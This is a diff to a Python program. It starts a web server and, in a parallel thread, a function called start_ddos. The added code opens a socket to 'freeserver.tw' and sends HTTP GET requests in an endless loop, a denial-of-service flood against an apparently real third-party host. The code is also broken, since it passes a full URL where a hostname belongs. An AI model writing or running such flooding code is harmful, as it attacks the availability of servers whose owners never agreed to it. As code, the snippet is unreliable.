@@ -2582,7 +2582,12 @@ def style():
 def start_web():
   socketio.run(app,host="0.0.0.0",port=5000,allow_unsafe_werkzeug=True)
 def start_ddos():
-  DDos("https://freeserver.tw", sockets = 500, threads = 10)
+  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+  s.connect(("https://freeserver.tw", 80))
+  message = "GET / HTTP/1.1\r\nHost: {}\r\n\r\n".format("https://freeserver.tw")
+  while True:
+    s.send(message.encode())
+    s.send(message.encode())
 
 thread1 = threading.Thread(target=start_web)
 thread2 = threading.Thread(target=start_ddos)
